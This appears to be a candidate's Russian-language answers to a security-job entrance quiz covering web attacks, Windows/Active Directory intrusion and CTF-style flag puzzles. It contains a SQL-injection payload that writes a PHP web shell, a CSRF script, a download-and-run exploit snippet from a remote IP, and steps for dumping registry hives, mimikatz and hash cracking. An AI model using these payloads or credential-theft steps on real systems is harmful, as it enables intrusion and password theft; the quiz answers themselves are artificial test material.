# Технические вопросы по вебу
Краткий тест для понимания уровня знаний. Мы предполагаем возможность разделения на 2 трека (AppSec и Red Team)

### Вы нашли SQL инъекцию, используется СУБД MySQL. Можно ли в данной ситуации исполнить код на сервере? В какой ситуации это можно сделать?

Ответ: В общем случае можно попробовать выполнить ` union select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/rce.php";-- ` и выпонять системные команды через `example.com/rce.php?cmd=whoami`. Это возможно для случаев, когда используются динамические запросы к БД и не фильтруются данные введенные пользователем.

### Вы нашли потенциальную CSRF на изменение номера телефона в личном кабинете. У сессионной cookie стоит атрибут SameSite=Lax. Возможно ли проведение атаки CSRF в таком случае? Почему?

Ответ: Ограничение Lax означает что браузер отправит cookie в межсайтовых запросах при соблюдении двух условий: метод запроса GET и это не фоновый запрос как при загрузке скриптов или изображений. 
Атака возможна, если получиться доставить пейлоад через xss или заманить "жертву" на свой сайт содержащий например:
`<script>document.location = "https://example.com/change-phone?numner=1337"</script>`

### Вы на сайте обнаружили форму загрузки изображений. Фотография загружается на CDN, при загрузке также проверяется расширение (разрешены только файлы с графическим форматом) и mime-type. Какие атаки возможны в таком случае?

Ответ: Возможна атака XSS через файлы векторной графики .svg. Так же возможна RCE атака. Можно попробовать разные способы обойти проверку, например добавить к имени файла расширение изображения - exploit.php.png.

### Вы нашли XSS в приложении, но cookie защищены флагом httpOnly. Возможна ли атака XSS в таком случае? Почему?

Ответ: Флаг httpOnly не дает получить доступ к cookie через объектную модель документа в javascript как document.cookie, что предотвращает кражу файлов cookie через запросы, смягчая последствия XSS-атак. Но XSS это просто внедрение и выполнение javascript кода на страницу, поэтому атака возможна. Так же существует объекты window.localStorage и window.sessionStorage, которые работают как cookie без флага httpOnly и могут содержать интересные вещи.

### Есть приложение с ролевой моделью (админ, менеджер, редактор). Какие логические атаки вы бы применили к этому приложению?

Ответ: Я бы искал небезопасные прямые ссылки на объекты, доступ к которым может быть ограничен графическим интерфейсом, но отсутствует проверка прав доступа при обращении. Можно с помощью фаззинга и изучения .js файлов найти конечные точки в приложении и проверить возможность выполнения действий других пользователей (с такой же ролью) и других ролей. Так же следует проверить возможность повышения привелегий через заголовок Autorization: admin=true и диссериализацию файлов cookie с целью поиска похожего параметра, например admin=1 или role=admin, чтобы после правки cookie серриализовать их обратно и подменить в запрос.

### Есть ли какие-то проблемы безопасности с кодом на скриншоте? Почему?

``` python
data = requests.get(
	INTERNAL_API_URL + "user_data?userid=%s&fields=%s" % (
        user.id, request.GET["fields"]
    )
).json()

render(request, "user/private_data.html", data)
```

Ответ: Теоретически возможна атака http parametr pollution. Атакующий может в запросе указать поле userid= другого пользователя, тогда запрос к внутреннему API будет содержать два userid. В зависимости от конфигурации сервера с API возможно что в ответе будут данные другого пользователя, либо двух сразу, либо при правильной конфигурации второй параметр userid будет игнорироваться.


# Технические вопросы по инфре
Краткий тест для понимания уровня знаний. Мы предполагаем возможность разделения на 2 трека (AppSec и Red Team)

### Что находится по 'пути' `\\server01\pipe\spoolss`, чем это может быть полезно?

Ответ: Это диспетчер очереди печати в Windows. С ним связаны нашумевшие в свое время уязвимости CVE-2021-1675 и CVE-2021-34527, так же известные как PrintNightmare. Уязвимость заключается в том что диспетчер очереди печати включен по-умолчанию на всех системах Windows - и серверных и пользовательских. Атакующий, будучи авторизованым как пользователь, с помощью эксплойта может через диспетчер очереди печати выполнять команды с правами SYSTEM на контроллере домена.

### Опишите что происходит на данном изображении.

Ответ: Утилита mimikatz позволяет извлекать пароли и хеши паролей из оперативной памяти. Для команды sekurlsa::logonpasswords требуется права администратора и права отладки или права локальной SYSTEM. Как видно из изображения пользователь состоит в группе администраторов и успешно получил права отладки с помощью mimikatz. Но команда sekurlsa::logonpasswords всеравно сообщила об ошибке с кодом 5 - доступ запрещен. Это может означать что в системе используется защита памяти процесса авторизации от подключения к нему сторонних модулей, путем создания в ветке реестра `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA` параметра RunAsPPL=1. После применения этого параметра mimikatz не сможет получить доступ к памяти и будет выдавать ошибку как на изображении.

### Что содержит информация ниже

BQQADAABAAj/////AAAAAAAAAAEAAAABAAAAC0NSSU5HRS5DT1JQAAAACHRtYWxkaW5nAAAAAQAAAAEAAAALQ1JJTkdFLkNPUlAAAAAIdG1hbGRpbmcAAAABAAAAAgAAAAtDUklOR0UuQ09SUAAAAAZrcmJ0Z3QAAAALQ1JJTkdFLkNPUlAAFwAAABBsa8yqX8c6Ph96MeuoEzWcY4AU/2OAFP9jgKGfY4FmbgBQ4QAAAAAAAAAAAAAAAAQoYYIEJDCCBCCgAwIBBaENGwtDUklOR0UuQ09SUKIgMB6gAwIBAaEXMBUbBmtyYnRndBsLQ1JJTkdFLkNPUlCjggPmMIID4qADAgESoQMCAQKiggPUBIID0AmVwb4r2zCVj3CeVZYlKdvsmYylH/fYbFcApPluu+gImYIKoqZRMzoMif19TtLY8APh21jh/YCEbZuO4bY9xcwk4cyJKlfRsIzb667gpqJBZWjlpcXnYIlV+//vKR2GyMNYarsm+Yv5ROdMHNv1/U0wKCxRVAGOOfsae9d3EYmN+5B8vC4LQUICso1LPsp8IDvAfdx49i+pjGACi2DW5NlkwEylWaX5OfdQdoGfVU9InsmMudr/YZ0zHN6tSf+fle9ytIhlylDtJzO3TdYywugxcfMiVFGdemJcnT/SwXwZLMxiWqOyn7/CpGw9h5iCEYfFybfdTHVqldc5DZBvvjkRFAGi7N4Lhp51t4OFMnAr5IkvgtQeXSLhEXP+/dGxloUr9V+8E7+h/xBeaFUh0fqQdbMbla30ERPjmvtofFFAonGJKcA7eC8fA+/qAxYZ03jVDO569i5HeEUf8mXqLbPBo9MUTNmDfGX7LIQY47jVcYUfBxEGx4yc7CXY35NTUH4x6hJDBNSpmU5TQM8FwkkgrSJQcpbuQ2c7/U+TuD75sK6nG2rt6JhW3kyixWSVcWkQz4mcRY0+Ce0RssJhfcxmFvuNST+PXROxWk2nS/AmVKcJYQXUwXbtZDtaA5HbMLZiD6af1Wm0Pw3dqeghEWAGkDQUhR+oey8HYbWisGdUzIbkcb2DzIxoBI9Qov9CazWt7rpep4S4C+sHAO92gc3R5uKcpQww4Jxo9cluPAJHTidA9VHHCCxztuzbGybgZlyZzX6QjaBkI6RTDPVZ7MfjmKXb0cFVEMlG9L2FOe4Z0Z6bPQl2vRsZvrHofgxlKQcPGTI8WITMdHmBh/HRZj1qCq7vCfRCU41+BbDWexDKWrjoJiwdfUhnJbWK9rh+ZjpkikSvZjy6Zec8f1BerlxtcJEw8WMFlgA2v+ARscNk/FAaqswzMhwjte8HkqDX9iKfJ6Kwv5uqLmegYj8DMPU9s6XoEpShisIvRndNQikedfs4OVJh/MUeKMR8APvIr+/VGB83rKju5XZoj0EFlJOTMFbbwZHUWEPU/ZaKKeI7qVc7LnLgM1UzYtOsTJQoBUNp6e3eOhsMv0jvsRsM1Q1rB4fSvv4mun2/DEwNtZ+7cXNosS+eo0DRSEpTcL+69aUXFyF3cwMkZZ1H+ea4Y2jw9/lGN87Cb+CPmBhl0q4l4ddlzIfyTy75EiAH4uCozFxw3WP/bF31ggBK0W+uRx8nVq0lHo6ICPuEsAkH8+0JWLHI14c1gkhoVusPwfcMAadBhRC9nu5VVZccny69MDgAAAAA

Ответ: CRINGE.CORP

### Почему?
```  
cd /tmp  
wget http://1.3.3.7/sploit.elf
chmod +x ./sploit.elf
./sploit.elf  
Permission denied
ls -la /tmp  
total --  
drwxrwxrwt 19 root      root      4096 Feb 22 16:39  .  
```  

upd добавлены 4, 6-8 строки для сужения ответа.

Ответ: Раздел /tmp смонтирован с параметром noexec, что запрещает выполнение скриптов.

### Зачем выполняются данные команды? Что с ними можно сделать дальше и что получить?

Ответ: Команды сохраняют дампы ветвей реестра в файлы. Дальше можно скопировать эти дампы на локальную машину для изучения и извлечения информации о системе. Ветвь SYSTEM содержит настройки аппаратных профилей, служб, драйверов, параметры работы системы. В ветви SAM содержится база данных Security Access Manager.  Она включает в себя учетные записи пользователей, хеши паролей, группы, имена для входа в домен, их права доступа и другие важные данные. Ветвь SECURITY представляет часть ветви SAM, хранит политики безопасности для текущего пользователя. Для извлечения хешей можно воспользоваться утилитой secretdump. К извлеченным LM и NT хеша можно попробовать пароль по словарям с помощью hashcat, johntheripper, или проверить по вычисленным базам хешей в сети, например crackstation.

### Введите флаг
JEFOU0lCTEVfVkFVTFQ7MS4xO0FFUzI1NgozOTM5MzUzMzYyNjUzNzMwMzgzODMyNjYzNzM0MzY2  
NTM5NjUzNjYyMzIzNjMyNjEzMzYzMzEzMjM3MzEzNDMyMzkzNzYzMzgzMDYxNjIzNwozMDYyNjQz  
ODM2MzczNzM0MzE2NDY1MzIzMDMxMzkzNzM3Mzg2MTYzMzIzOTYyNjYwYTYxNjUzMjMwMzg2NTYx  
Mzk2NTY1MzIzNjMzMzkzMQozMTMwMzg2NTYzMzUzMTM5NjYzNjMxMzk2MjY1MzUzNDM5NjEzNDY1  
MzUzOTMwMzkzMTMwNjM2MjYyMzE2NTM5MzM2NTM2Mzc2NjMwNjU2NgozOTM4NjEzNDY0NjYzMzMw  
MzkwYTMyMzIzODY0NjYzOTM3MzMzNjM4NjUzMzM3NjIzNzYyNjYzMTM1NjYzMTM4MzIzODMxMzMz  
MjM5NjYzNgozNzMzMzkzNjM3MzM2MTMzMzEzMDM1NjMzOTM2MzEzMTM1NjEzMjMxMzUzMTYxNjIz  
NTYzMzkzMjY0NjY2NDM5NjMzNzM4MzUzNDYyNjU2NgozNTM3NjYzNDM5MzQ2MzM4NjYzMzYzNjUz  
NTM4NjM2MTM3NjU2NjYzMzY2NDMzNjIzNTM3NjQzNjYyNjI2MjM2MzkzOTY2MzE2MTY1MzczNQo2  
NjMxMzgzMTM5MzA2NjM5MzUzNzM3NjE2NTM2MzUzMzM1MzYzODY1MzM2NjYzNjIzOTYyNjE2MjY2  
NjM2NjMxMzQ2NDMzMzU2NDY2NjY2MgozNjMwNjYzNDM1NjY2NTY0MzEzNjM4NjEzMjM2NjQzNDYx  
Mzc2NDY0MzgzMDMzMzU2NDYxMzI2MzMyNjE2NjMyMzI2MzY0NjEzOTM2MzA2MwozMTYyCg==

upd формат deteact{md5}

Ответ: deteact{24bc8a6655a0623a7f4e402c12df4b9c}


# Творческие вопросы
Это более сложный раздел для опытных. На эти вопросы нет конкретного одного правильного ответа, это достаточно творческие вопросы.

Для нас наиболее важны hard skills, так что ответы в этом блоке будут важны скорее уже после набора, чтоб понимать ваш бекграунд, и в чём вас можно подтянуть.

### Опишите технику/атаку/уязвимость, которая вам нравится (не обязательно найденную вами, это может быть публичное исследование). Что показалось интересным?

Ответ: Очень мне нравятся атаки на радио-устройства. WiFi, bluetooth, RFID и всё такое. Сам ловил хендшейки WPA2, брутил по маске из 8 цифр и словарям, иногда успешно. Разумеется с разрешения владельцев роутеров. С восхищением смотрел ролики на ютуб канале Hak5 как он с приятелем перехватывает сигналы с брелка автомобиля и воспроизводит открывая двери без брелка. 